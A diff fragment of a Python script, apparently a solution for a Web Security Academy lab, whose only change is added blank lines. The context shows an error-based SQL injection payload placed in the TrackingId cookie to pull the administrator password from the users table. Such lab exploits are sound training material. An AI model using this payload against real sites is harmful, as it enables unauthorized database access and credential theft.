@@ -29,6 +29,7 @@ import re
 #########
 # change this to your lab URL
 url = "https://0a26002f043b16d3812b9446003d00aa.web-security-academy.net"
+
 print(Fore.BLUE + "[#] Injection point: " + Fore.YELLOW + "TrackingId")
 
 # payload to retrieve the administrator password
@@ -36,6 +37,7 @@ payload = "'%3bSELECT CAST((select password from users limit 1) AS int)-- -"
 cookies = {
     "TrackingId": payload
 }
+
 try: # inject the payload to make the datebase return an error
     injection = requests.get(f"{url}/filter?category=Pets", cookies=cookies)
     print(Fore.WHITE + "1. Injecting payload to retrieve the administrator password.. " + Fore.GREEN + "OK")
